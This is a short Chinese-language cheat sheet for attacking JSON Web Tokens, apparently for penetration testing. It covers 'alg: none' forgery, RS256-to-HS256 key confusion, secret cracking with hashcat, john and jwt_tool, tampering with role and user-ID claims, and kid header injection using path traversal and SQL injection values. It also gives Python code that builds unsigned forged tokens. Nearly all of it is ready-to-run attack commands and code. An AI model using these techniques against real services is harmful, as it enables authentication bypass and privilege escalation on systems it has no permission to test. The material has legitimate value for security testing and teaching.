# JWT 攻击参考

## 攻击向量

### 1. 算法篡改 — none 攻击

```bash
# Header: {"alg":"none","typ":"JWT"}
# 移除签名部分，保留末尾的点
# 例: eyJ...header.eyJ...payload.
```

### 2. 算法混淆 — RS256 → HS256

```bash
# 获取服务端公钥（通常在 /jwks.json, /.well-known/jwks.json）
# 使用公钥作为 HMAC 密钥对 payload 签名
```

### 3. 弱密钥爆破

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

### 4. Payload 篡改

```bash
# 解码 Base64 → 修改 user_id/role/sub → 重新编码
# 常见可篡改字段: sub, role, admin, user_id, email, iss
```

### 5. kid 注入

```bash
# Header 中的 kid 参数可能存在 SQL 注入或路径遍历
# {"alg":"HS256","kid":"../../dev/null"}  → 密钥为空文件
# {"alg":"HS256","kid":"' UNION SELECT 'key' --"}
```

## jwt_tool 使用

```bash
# 解码 JWT
python3 jwt_tool.py <JWT>

# 自动测试所有攻击向量
python3 jwt_tool.py <JWT> -M at

# 交互式修改 payload
python3 jwt_tool.py <JWT> -T

# 爆破密钥
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

## 手动 JWT 操作 (Python)

```python
import base64
import json

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

def encode_jwt_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    return f"{h.decode()}.{p.decode()}."
```
